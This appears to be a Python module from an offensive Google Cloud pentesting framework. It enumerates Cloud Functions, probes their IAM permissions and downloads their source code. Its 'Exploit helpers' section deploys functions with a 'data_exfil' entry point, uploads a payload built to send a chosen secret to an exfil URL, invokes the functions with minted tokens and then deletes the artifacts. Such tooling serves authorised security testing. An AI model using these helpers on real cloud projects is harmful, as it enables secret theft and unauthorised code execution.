        print(f"[DEBUG] Getting function {function_name} ...")

    function_meta = None

    try:
        # Initialize request argument(s)
        request = functions_v2.GetFunctionRequest(
            name=function_name
        )

        # Make the request
        function_meta = function_client.get_function(request=request)

    except InvalidArgument as e:
        if "400 Malformed name" in str(e):
            print(f"[X] Function name {function_name} is malformed. Make sure to do the format projects/*/locations/*/functions/*")

    except Exception as exc:
        handle_service_error(
            exc,
            api_name="cloudfunctions.functions.get",
            resource_name=function_name,
            service_label="Cloud Functions",
            project_id=function_name,
            return_not_enabled=False,
        )

    if debug:
        print(f"[DEBUG] Successfully called list_functions for {function_name} ...")

    # Handle the response

    return function_meta


class CloudFunctionsResource:
    """Enumerate functions into ``cloudfunctions_functions`` and download their source archives.

    Hand-rolled resource over the functions_v2 client (which lists both gen1 and gen2). Normalizes
    proto state/environment enums to readable strings (_STATE_MAP / _normalize_environment) and
    extracts the backing GCS source location so download() can pull the function's code zip.
    test_iam_permissions adaptively drops permissions the API rejects as unsupported (gen1 vs gen2
    differ) and caches them so later functions skip the bad ones.
    """

    TABLE_NAME = "cloudfunctions_functions"
    COLUMNS = ["name", "region_val", "env", "state_output", "url"]
    LIST_PERMISSION = "cloudfunctions.functions.list"
    GET_PERMISSION = "cloudfunctions.functions.get"
    TEST_IAM_API_NAME = "cloudfunctions.functions.testIamPermissions"
    TEST_IAM_PERMISSIONS = permissions_with_prefixes(
        "cloudfunctions.functions.",
        exclude_permissions=(
            "cloudfunctions.functions.create",
            "cloudfunctions.functions.list"
        ),
    )
    SERVICE_LABEL = "Cloud Functions"
    _STATE_MAP = {
        1: "ACTIVE",
        2: "FAILED",
        3: "DEPLOYING",
        4: "DELETING",
        5: "UNKNOWN",
        "ACTIVE": "ACTIVE",
        "FAILED": "FAILED",
        "DEPLOYING": "DEPLOYING",
        "DELETING": "DELETING",
        "UNKNOWN": "UNKNOWN",
    }

    def __init__(self, session):
        self.session = session
        self.client = functions_v2.FunctionServiceClient(credentials=session.credentials)
        self.client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=session.credentials)
        self._unsupported_test_iam_permissions: set[str] = set()

    @staticmethod
    def _resource_name(row_or_name):
        return resource_name_from_value(row_or_name, "name")

    def resource_name(self, row_or_name: Any) -> str:
        return self._resource_name(row_or_name)

    @staticmethod
    def _safe_filename_component(value: str) -> str:
        token = re.sub(r"[^A-Za-z0-9._-]+", "_", str(value or "").strip())
        return token or "cloudfunction"

    @staticmethod
    def _build_download_path(
        *,
        function_name: str,
        environment: str,
        output: str | None,
        project_id: str | None,
        session,
    ) -> Path:
        filename = f"{CloudFunctionsResource._safe_filename_component(function_name)}_{environment}_source.zip"
        if output:
            requested = Path(output).expanduser()
            if requested.exists() and requested.is_dir():
                return requested / filename
            if not requested.suffix:
                requested.mkdir(parents=True, exist_ok=True)
                return requested / filename
            # output was a file path; avoid overwriting unrelated requests by appending a token
            if requested.name == requested.stem:
                return requested.with_name(f"{requested.stem}_{CloudFunctionsResource._safe_filename_component(function_name)}{requested.suffix}")
            return requested

        return Path(
            session.get_download_save_path(
                service_name="cloudfunctions",
                project_id=project_id,
                subdirs=["function_sources"],
                filename=filename,
            )
        )

    @staticmethod
    def _normalize_environment(environment: Any) -> str:
        value = str(environment or "").strip()
        if value in {"1", "GEN_1"}:
            return "GEN_1"
        if value in {"2", "GEN_2"}:
            return "GEN_2"
        if not value:
            return "GEN_2"
        if value.isdigit():
            return "GEN_1" if value == "1" else "GEN_2"
        return value

    @staticmethod
    def _action_resource_type(row_or_name):
        environment = getattr(row_or_name, "environment", None)
        if environment in (None, "") and isinstance(row_or_name, dict):
            environment = row_or_name.get("environment")
        if str(environment) == "1":
            return "functions_v1"
        return "functions_v2"

    def _action_label(self, row_or_name):
        function_name = self._resource_name(row_or_name)
        location = extract_path_segment(function_name, "locations")
        function_id = extract_path_segment(function_name, "functions")
        if location and function_id:
            return f"[{location}] {function_id}"
        return function_name

    @staticmethod
    def _extract_field(payload: dict[str, Any], *keys: str):
        for key in keys:
            value = payload.get(key)
            if value not in (None, "", []):
                return value
        return None

    def _normalize_row(self, row_or_name: Any) -> dict[str, Any]:
        payload = resource_to_dict(row_or_name) if not isinstance(row_or_name, dict) else dict(row_or_name)
        if not payload:
            return {}
        payload = dict(payload)
        payload["region_val"] = extract_location_from_resource_name(payload)
        payload["env"] = self._normalize_environment(payload.get("environment"))
        payload["state_output"] = self._STATE_MAP.get(payload.get("state"), payload.get("state"))
        return payload

    def _extract_source_location(self, payload: dict[str, Any]) -> tuple[str, str] | None:
        """Find the function's source in GCS as (bucket, object_path); handles gen1 + gen2 shapes.

        gen1 carries a gs:// sourceArchiveUrl; gen2 nests it under buildConfig.source.storageSource.
        Returns None when no GCS source is present.
        """
        candidates = [
            self._extract_field(payload, "source_archive_url", "sourceArchiveUrl"),
            self._extract_field(payload, "source_archive", "sourceArchive"),
        ]
        for candidate in candidates:
            if isinstance(candidate, str):
                parsed = urlparse(candidate.strip())
                if parsed.scheme == "gs":
                    bucket = parsed.netloc
                    object_path = parsed.path.lstrip("/")
                    if bucket and object_path:
                        return bucket, object_path

        build_config = self._extract_field(payload, "build_config", "buildConfig") or {}
        source_config = self._extract_field(build_config, "source")
        storage_source = self._extract_field(source_config or {}, "storage_source", "storageSource")
        if isinstance(storage_source, dict):
            bucket = self._extract_field(storage_source, "bucket")
            object_path = self._extract_field(storage_source, "object_", "object")
            if bucket and object_path:
                return str(bucket).strip(), str(object_path).strip().lstrip("/")
        return None

    def resolve_regions(self, *, v1_regions=False, v2_regions=False, v1v2_regions=False, regions_list=None, regions_file=None):
        """Resolve the region list to enumerate: gen1/gen2/both static lists, a CLI list/file, or workspace default.

        gen1 and gen2 support different region sets (the [cloudfunctions_v1] /
        [cloudfunctions_v2] sections of mappings/service_locations.txt); the flags pick
        which to fan out over. Explicit regions_list/regions_file override.
        """
        if v1_regions:
            return static_locations("cloudfunctions_v1")
        if v2_regions:
            return static_locations("cloudfunctions_v2")
        if v1v2_regions:
            return sorted(set(static_locations("cloudfunctions_v1")) | set(static_locations("cloudfunctions_v2")))
        if regions_list:
            return parse_csv_arg(regions_list)
        if regions_file:
            return read_lines(regions_file)
        return getattr(self.session.workspace_config, "preferred_regions", None)

    def list(self, *, project_id: str, location: str | None = None, parent: str | None = None, action_dict=None):
        if parent is None and location is not None:
            parent = f"projects/{project_id}/locations/{location}"
        rows = list_functions(self.client, parent, debug=getattr(self.session, "debug", False))
        if rows not in ("Not Enabled", None):
            record_permissions(
                action_dict,
                permissions=self.LIST_PERMISSION,
                scope_key="project_permissions",
                scope_label=project_id,
            )
        if rows in ("Not Enabled", None):
            return rows
        normalized_rows: list[dict[str, Any]] = []
        for row in rows:
            if isinstance(row, dict) and row:
                normalized_rows.append(row)
                continue
            row_payload = self._normalize_row(row)
            if row_payload:
                normalized_rows.append(row_payload)
        return normalized_rows

    def get(self, *, resource_id: str, action_dict=None):
        row = get_function(self.client, resource_id, debug=getattr(self.session, "debug", False))
        if row:
            row = self._normalize_row(row)
            record_permissions(
                action_dict,
                permissions=self.GET_PERMISSION,
                project_id=extract_project_id_from_resource(resource_id),
                resource_type=self._action_resource_type(row),
                resource_label=self._action_label(row),
            )
        return row

    def test_iam_permissions(self, *, resource_id: str, action_dict=None):
        """Probe granted perms on a function; degrade gracefully when the API rejects some.

        Tries the full set at once; on InvalidArgument it retries permission-by-permission to
        find which are unsupported for this function (gen1/gen2 differ), caches them on
        self._unsupported_test_iam_permissions so subsequent functions skip them, and records the
        granted set as evidence (provenance test_iam_permissions).
        """
        project_id = extract_project_id_from_resource(resource_id) or None
        candidate_permissions = [
            permission
            for permission in self.TEST_IAM_PERMISSIONS
            if permission not in self._unsupported_test_iam_permissions
        ]
        if not candidate_permissions:
            return []

        def _invoke(permission_list: list[str]) -> list[str]:
            request = iam_policy_pb2.TestIamPermissionsRequest(
                resource=str(resource_id or "").strip(),
                permissions=permission_list,
            )
            response = self.client.test_iam_permissions(request=request)
            return list(getattr(response, "permissions", []) or [])

        try:
            permissions = _invoke(candidate_permissions)
        except InvalidArgument:
            granted: set[str] = set()
            newly_unsupported: set[str] = set()
            for permission in candidate_permissions:
                try:
                    granted.update(_invoke([permission]))
                except InvalidArgument:
                    newly_unsupported.add(permission)
                except Exception as exc:
                    result = handle_service_error(
                        exc,
                        api_name=self.TEST_IAM_API_NAME,
                        resource_name=resource_id,
                        service_label=self.SERVICE_LABEL,
                        project_id=project_id,
                        return_not_enabled=False,
                    )
                    return [] if result in (None, "Not Enabled") else list(result or [])
            if newly_unsupported:
                unseen = newly_unsupported - self._unsupported_test_iam_permissions
                self._unsupported_test_iam_permissions.update(newly_unsupported)
                if unseen:
                    print(
                        f"[!] cloudfunctions.functions.testIamPermissions rejected "
                        f"{len(unseen)} unsupported permission(s); skipping them for remaining functions."
                    )
            permissions = sorted(granted)
        except Exception as exc:
            result = handle_service_error(
                exc,
                api_name=self.TEST_IAM_API_NAME,
                resource_name=resource_id,
                service_label=self.SERVICE_LABEL,
                project_id=project_id,
                return_not_enabled=False,
            )
            permissions = [] if result in (None, "Not Enabled") else list(result or [])

        if permissions:
            record_permissions(
                action_dict,
                permissions=permissions,
                project_id=project_id,
                resource_type=self._action_resource_type(resource_id),
                resource_label=self._action_label(resource_id),
            )
        return permissions

    def save(self, rows, *, project_id=None, location=None, **_):
        for row in rows or []:
            payload = self._normalize_row(row)
            if not payload:
                continue
            save_to_table(
                self.session,
                "cloudfunctions_functions",
                payload,
                extra_builder=lambda _obj, raw: {
                    "project_id": extract_project_id_from_resource(raw.get("name", "")),
                },
            )

    # ------------------------------------------------------------------
    # Exploit helpers (create / update / invoke / delete)
    # ------------------------------------------------------------------

    def create(self, *, function_name: str, source_uri: str, version: str,
               entry_point: str = "data_exfil", sa: Optional[str] = None,
               env_vars: Optional[Dict[str, str]] = None, runtime: str = "python314"):
        client = self.client_v1 if version == "1" else self.client
        return _create_function(
            client, function_name, source_uri, version, entry_point,
            sa=sa, env_vars=env_vars, runtime=runtime,
        )

    def update(self, *, function_name: str, source_uri: str, version: str,
               entry_point: str = "data_exfil", sa: Optional[str] = None,
               env_vars: Optional[Dict[str, str]] = None, runtime: str = "python314"):
        client = self.client_v1 if version == "1" else self.client
        return _update_function(
            client, function_name, source_uri, version, entry_point,
            sa=sa, env_vars=env_vars, runtime=runtime,
        )

    def get_invoke_url(self, *, function_name: str) -> str:
        """Return the HTTPS trigger URL for a function (works for V1 and V2)."""
        region = extract_path_segment(function_name, "locations")
        project = extract_project_id_from_resource(function_name)
        simple_name = extract_path_segment(function_name, "functions")
        return f"https://{region}-{project}.cloudfunctions.net/{simple_name}"

    def invoke_v1(self, *, function_name: str) -> Optional[str]:
        """Invoke a V1 function via the SDK; return response text or None."""
        try:
            client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=self.session.credentials)
            req = functions_v1.CallFunctionRequest(name=function_name, data="test")
            resp = client_v1.call_function(request=req)
            return resp.result
        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.invoke [v1]",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=extract_project_id_from_resource(function_name),
                return_not_enabled=False,
            )
            return None

    def invoke_v2(self, *, function_name: str, path: str = "") -> Optional[str]:
        from google.auth.transport.requests import Request as _GAuthReq

        base_url = self.get_invoke_url(function_name=function_name)
        invoke_url = base_url.rstrip("/") + path if path else base_url
        creds = self.session.credentials
        id_token: Optional[str] = None

        # Mint OIDC ID token with audience = base URL (no path)
        try:
            from google.oauth2.service_account import IDTokenCredentials as _IDTCreds
            _TOKEN_URI = "https://oauth2.googleapis.com/token"
            id_creds = _IDTCreds(
                creds._signer,
                service_account_email=creds.service_account_email,
                token_uri=_TOKEN_URI,
                target_audience=base_url,
            )
            id_creds.refresh(_GAuthReq())
            id_token = id_creds.token
        except (AttributeError, Exception):
            pass

        # Fallback: access token (works if function is public or caller has run.invoker)
        if not id_token:
            if not creds.valid:
                creds.refresh(_GAuthReq())
            id_token = creds.token

        try:
            resp = requests.post(
                invoke_url,
                headers={"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"},
                json={"data": "test"},
                timeout=70,
            )
            return resp.text
        except Exception as e:
            print(f"{UtilityTools.YELLOW}[!] V2 invoke error: {e}{UtilityTools.RESET}")
            return None

    def invoke(self, *, function_name: str, version: str, path: str = "") -> Optional[str]:
        if version == "1":
            return self.invoke_v1(function_name=function_name)
        return self.invoke_v2(function_name=function_name, path=path)

    def delete(self, *, function_name: str, version: str) -> bool:
        """Delete a function; blocks on the V2 LRO. Returns True on success."""
        try:
            if version == "1":
                client_v1 = functions_v1.CloudFunctionsServiceClient(credentials=self.session.credentials)
                client_v1.delete_function(name=function_name)
            else:
                op = self.client.delete_function(name=function_name)
                op.result()
            return True
        except Exception as exc:
            handle_service_error(
                exc,
                api_name="cloudfunctions.functions.delete",
                resource_name=function_name,
                service_label="Cloud Functions",
                project_id=extract_project_id_from_resource(function_name),
                return_not_enabled=False,
            )
            return False

    def build_and_upload_payload(self, *, bucket: str, project_id: str, exfil_url: str = "", secret_path: str = "", runtime: str = "python314") -> Optional[str]:
        import time as _t
        zip_bytes = _build_payload_zip(exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
        obj_name = f"gcpwn-cf-url-{int(_t.time())}.zip"
        dest_uri = f"gs://{bucket}/{obj_name}"
        try:
            sc = storage.Client(credentials=self.session.credentials, project=project_id)
            sc.bucket(bucket).blob(obj_name).upload_from_string(zip_bytes, content_type="application/zip")
            return dest_uri
        except Exception as exc:
            handle_service_error(
                exc,
                api_name="storage.objects.create",
                resource_name=dest_uri,
                service_label="Cloud Storage",
                project_id=project_id,
                return_not_enabled=False,
            )
            return None

    def delete_gcs_object(self, *, gcs_uri: str, project_id: str) -> bool:
        """Delete a GCS object by gs:// URI. Returns True on success."""
        stripped = gcs_uri[5:]  # remove "gs://"
        bucket = stripped.split("/")[0]
        obj = "/".join(stripped.split("/")[1:])
        try:
            sc = storage.Client(credentials=self.session.credentials, project=project_id)
            sc.bucket(bucket).blob(obj).delete()
            return True
        except Exception:
            return False

    def check_external_curl(self, *, function_url: str):
        return check_anonymous_external(function_url=function_url)

    def download(self, *, row: Any | None = None, resource_id: str | None = None, output: str | None = None) -> list[Path]:
        """Download a function's source-code zip from its backing GCS object to disk.

        Resolves the (bucket, object) source location, then pulls it with a storage client
        (requires storage.objects.get). Returns the written path(s), or [] when there's no GCS
        source or the download is denied/missing. Side effect: writes a zip under the loot dir.
        """
        payload = self._normalize_row(row or {"name": resource_id})
        function_name = str(payload.get("name") or "").strip()
        if not function_name:
            return []

        source_artifact = self._extract_source_location(payload)
        if not source_artifact:
            return []

        bucket_name, object_path = source_artifact
        project_id = extract_project_id_from_resource(payload)

        output_path = self._build_download_path(
            function_name=function_name,
            environment=self._normalize_environment(payload.get("environment")),
            output=output,
            project_id=project_id,
            session=self.session,
        )
        output_path.parent.mkdir(parents=True, exist_ok=True)
        try:
            storage_client = storage.Client(credentials=self.session.credentials, project=project_id or None)
            blob = storage_client.bucket(bucket_name).blob(object_path)
            blob.download_to_filename(str(output_path))
            return [output_path]
        except Exception as exc:
            handle_service_error(
                exc,
                api_name="storage.objects.get",
                resource_name=f"gs://{bucket_name}/{object_path}",
                service_label="Cloud Storage",
                project_id=project_id,
                return_not_enabled=False,
            )
            return []
